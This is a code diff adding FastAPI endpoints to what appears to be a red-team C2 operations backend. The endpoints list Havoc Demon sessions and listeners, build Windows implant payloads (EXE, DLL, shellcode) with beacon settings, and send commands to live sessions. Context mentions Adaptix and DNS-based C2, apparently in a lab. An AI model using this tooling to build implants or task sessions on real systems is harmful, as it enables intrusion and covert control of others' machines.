@@ -284,6 +284,72 @@ class AdaptixTaskRequest(BaseModel):
     cmdline: str = Field(..., description="Raw Adaptix command, e.g. 'whoami'")
 
 
+class HavocBuildRequest(BaseModel):
+    arch: str = Field("x64", description="x64 | x86")
+    format: str = Field("Windows Exe",
+                        description="Windows Exe | Windows Dll | Windows Shellcode | "
+                                    "Windows Service Exe")
+    listener: str = Field("c2stack - http", description="Listener instance name")
+    sleep: int = Field(5, description="Beacon sleep in seconds")
+    jitter: int = Field(15, description="0-100")
+
+
+@app.get("/api/ops/havoc/sessions")
+def ops_havoc_sessions() -> dict[str, Any]:
+    """Live Havoc Demon sessions via the raw WebSocket protocol."""
+    import havoc_client as hv
+    try:
+        return {"ok": True, "sessions": hv._run(hv.HavocClient().list_sessions())}
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
+@app.get("/api/ops/havoc/listeners")
+def ops_havoc_listeners() -> dict[str, Any]:
+    import havoc_client as hv
+    try:
+        r = hv._run(hv.HavocClient().login_and_scan())
+        return {"ok": True, "authenticated": r["authenticated"],
+                "listeners": r["listeners"]}
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
+@app.post("/api/ops/havoc/build")
+def ops_havoc_build(req: HavocBuildRequest) -> dict[str, Any]:
+    """Build a Demon payload server-side. No Qt client involved.
+
+    Returns the PE base64-encoded plus the team's build console so failures
+    (e.g. a missing cross-compiler) are visible rather than a bare error.
+    """
+    import havoc_client as hv
+    try:
+        cfg = hv.demon_config(sleep=req.sleep, jitter=req.jitter)
+        result = hv._run(hv.HavocClient().build_payload(
+            listener=req.listener, arch=req.arch, fmt=req.format, config=cfg))
+        return {
+            "ok": True,
+            "filename": result["filename"],
+            "size": result["size"],
+            "base64": base64.b64encode(result["payload"]).decode("ascii"),
+            "console": result["console"],
+        }
+    except hv.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
+@app.get("/api/ops/havoc/task")
+def ops_havoc_task(demon_id: str, command: str,
+                   wait: int = 25) -> dict[str, Any]:
+    """Task a Havoc session directly (the /api/ops/task path also covers this)."""
+    import havoc_client as hv
+    try:
+        return {"ok": True, "result": hv._run(
+            hv.HavocClient().task(demon_id, command, wait=float(wait)))}
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
 class DnsDissectRequest(BaseModel):
     payload_text: str = Field(default="whoami /all", description="Command or message to transmit over DNS TXT")
     domain_suffix: str = Field(default="c2.cadre.local", description="DNS C2 zone suffix")
